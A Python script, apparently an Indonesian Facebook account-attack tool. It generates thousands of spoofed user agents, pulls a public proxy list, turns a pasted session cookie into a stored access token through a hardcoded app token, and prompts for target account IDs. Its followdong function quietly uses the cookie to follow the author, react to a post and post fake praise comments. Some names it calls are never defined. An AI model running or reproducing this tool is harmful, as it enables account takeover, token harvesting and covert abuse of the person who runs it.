import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parse
from time import time as TimeRikodYatim
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
entot=[]
ugen4=["Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 Instagram 291.0.0.24.64 (iPhone10,6; iOS 15_6_1; it_IT; it; scale=3.00; 1125x2436; 493426079)","Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 8.0.0; AGS2-W09 Build/HUAWEIAGS2-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022143610","Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82 Trailer/97.3.4562.63","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82 LikeWise/100.6.5805.6","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A715F/A715FXXU8DVK3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G950F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 10; HMA-L29 Build/HUAWEIHMA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; DUK-L09 Build/HUAWEIDUK-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140634","Mozilla/5.0 (Linux; Android 11; W-V755-EEA Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140650"]
ugen3=[]
ugen2=[]
ugen=[]
cokbrut=[]
ualu=[]
ualuh=[]
ses=requests.Session()
princp=[]
try:
	#prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	#prox= requests.get('https://spys.me/socks.txt').text
	open('ewean.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah !!!]')
	exit()
prox=open('ewean.txt','r').read().splitlines()

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='10; SM-G970F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/75.0.3396.81 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
  
for x in range(999):
	rr = random.randint
	rc = random.choice
	samsung = random.choice(["SM-J120H","SM-J120F","SM-J120M","SM-J111M","SM-J111F","SM-J110H","SM-J110G","SM-J110F","SM-J110M","SM-J105H","SM-J105Y","SM-J105B","SM-J106H","SM-J106F","SM-J106B","SM-J106M","SM-J200F","SM-J200M","SM-J200G","SM-J200H","SM-J200F","SM-J200GU","SM-J260M","SM-J260F","SM-J260MU","SM-J260F","SM-J260G","SM-J200BT","SM-G532G","SM-G532M","SM-G532MT"])
	realme= random.choice(["RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901"])
	redmi = random.choice(["Mi 11 Lite 5G","Redmi Note 12 Pro+ 5G","Redmi Note 8T","Mi 10T","Xiaomi 12T","Mi 10","Redmi 6","MI MAX 3","Redmi Note 10 Pro","Redmi Note 9 Pro","Redmi 9 Pro","Redmi S2","POCO X3 NFC","Redmi 10C","Redmi Note 11S","M2006C3MG MIUI/V12.0.18.0.QCRMXAT","POCO X3 GT"," Redmi 7A","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C"])
	oppo = random.choice(["zh-TW; PERM10","OPPO A73","PEFM00","A201OP","PDCM00","PCHM00","OPPO A73","PEFM00","CPH2185","OPPO A79k","CPH2525","PESM10","PBCM30","OPPO A73t","OPPO A59st","PEAT00","Reno 9 Pro+","Reno 5 Pro Plus 5G","R819T","R8205","R8207","R823T","R829","R829T","R830","R830S","R833T","R2001","R2010","R2017","CNM632","CPH1114","CPH1235","CPH1451","CPH1615","CPH1664","CPH1869","CPH1929","CPH1985","CPH2048","CPH2107","CPH2238","CPH2261","CPH2331","CPH2332","CPH2351","CPH2389","CPH2419","CPH2451","CPH2465","CPH2467","CPH2513","CPH2515","CPH2521","CPH2525","CPH2529","CPH2531","CPH2589","CPH2643","CPH3475","CPH3669","CPH3682","CPH3731","CPH3776","CPH3785","CPH4125","CPH4275","CPH4299","CPH4395","CPH4473","CPH4987","CPH5286","CPH5841","CPH5947","CPH6178","CPH6244","CPH6271","CPH6316","CPH6519","CPH6528","CPH6697","CPH7338","CPH7364","CPH7382","CPH7532","CPH7577","CPH7991","CPH8153","CPH8346","CPH8347","CPH8363","CPH8393","CPH8467","CPH8472","CPH8534","CPH8686","CPH8893","CPH9177","CPH9226","CPH9659","CPH9667","CPH9716","CPH9763","CPH9929"])
	build1 = random.choice(['OPM1','OPM2','OPM3','OPM4','OPM5','OPM6','OPD1','QD1A','OPR6','TPR1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
	build2 = random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
	z = random.choice(["gn","go"])
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; {samsung} Build/{build1}.{str(rr(111111,210000))}.{build2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(6,22))}.{str(rr(1,5))} Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36"
	ua2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; {realme} Build/{build1}.{str(rr(111111,210000))}.{build2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 RealmeBrowser/{str(rr(10,45))}.{str(rr(1,9))}.0.{str(rr(1,20))}"
	ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; {redmi} Build/{build1}.{str(rr(111111,210000))}.{build2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{z}"
	ua4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; {oppo} Build/{build1}.{str(rr(111111,210000))}.{build2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 HeyTapBrowser/{str(rr(2,45))}.{str(rr(5,9))}.{str(rr(1,36))}.{str(rr(1,4))}"
	uaku = random.choice([ua1, ua2, ua3, ua4])
	ugen.append(uaku)
	
for x in range(9999):
	rr = random.randint
	rc = random.choice
	z = random.choice(["gn","go"])
	x = random.choice(["A","S","T","X","+"])
	ua = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; Redmi Note {str(rr(3,14))}{x}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{z}"
	entot.append(ua)
	
for memekx in range(2000):
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	ugen3.append(api)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

T = ('\x1b[1;94m')
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
zxc = str(tgl)+'-'+str(bln)+'-'+str(thn)

def ewean(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.07)
def fahrukate(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

expired_script = ['12', '07', '2073']

def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		clear()
		ewean(f"{ewe}script/tools ini sudah kadaluarsa")
		os.system("xdg-open https://www.facebook.com/1781113094")
		exit()
	else:
		login()

def cek_expired_script():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		clear()
		ewean(f"{ewe}script/tools ini sudah kadaluarsa")
		os.system("xdg-open https://www.facebook.com/1781113094")
		exit()
	else:
		pass

def banner():
	print(f"""{A}#{Z}#{J}#{N}""")

def login():
	try:
		token = open('token.txt','r').read()
		cok = open('cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		your_cookies = input('└─Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("└─Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n└─Token : {access_token}")
							tokenew = open("token.txt","w").write(access_token)
							cook= open("cok.txt","w").write(your_cookies)
							print("\n└─Login Berhasil");followdong()
			except Exception as e:
				print("└─Cookie/Akun Tumbal Checkpoint !")
				os.system('rm -rf token.txt && rm -rf cok.txt')
				print(e)
				time.sleep(3)
				exit()
	except:pass

def followdong():
	try:
		token = open('token.txt','r').read()
		cokies = open('cok.txt','r').read()
	except IOError:
		print('└─Cookie Kadaluarsa ')
		time.sleep(5)
		login()
	myuid = ('100047767693724') # YANG UBAH ANAK HARAM #
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error
	try:
		rct=ses.get(f"https://mbasic.facebook.com/100047767693724/posts/785661169702799/?app=fbl",cookies=cokies).text
		react=bs(rct,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
		react=ses.get(mbasic.format(react),cookies=cokies).text
		ty=["&reaction_type=2&","&reaction_type=16&","&reaction_type=3&","&reaction_type=8&"]
		ty=random.choice(ty)
		type=bs(react,"html.parser").find("a",href=lambda x: ty in x)["href"]
		ses.get(mbasic.format(type),cookies=cokies)
	except:
		pass
	try:
		kmn=ses.get("https://mbasic.facebook.com/100047767693724/posts/785661169702799/?app=fbl",cookies=cokies).text
		kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
		dt=kmn.find_all("input",type="hidden")
		text=["Hi bang tools nya keren banget!","tools nya sangat berguna!","semoga rejeki abang di lancarin amin","tools yang sangat bagus!","be yourself and never surrender"]
		random_komen=random.choice(text)
		ses.post(mbasic.format(kmn["action"]),data={"fb_dtsg":dt[0]["value"],"jazoest":dt[1]["value"],"comment_text":random_komen},cookies=cokies)
	except:
		pass
			
def menu(my_name,my_id):
	try:
		token = open('token.txt','r').read()
		cok = open('cok.txt','r').read()
	except IOError:
		exit()
	try:
		clear()
		ip = requests.get("https://api.ipify.org").text
		print(f"{A}[{M}●{A}] {P}{ip}")
		fahrukate('━' * 55)
		jum = int(input(f'{A}[{H}●{A}] {P}input target amount ? : '))
	except ValueError:
		print('└─ wrong input ')
		exit()
	if jum<1 or jum>100:
		print('└─ Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{A}[{H}●{A}] {P}Enter the Id '+str(yz)+' : ')
		uid.append(kl)
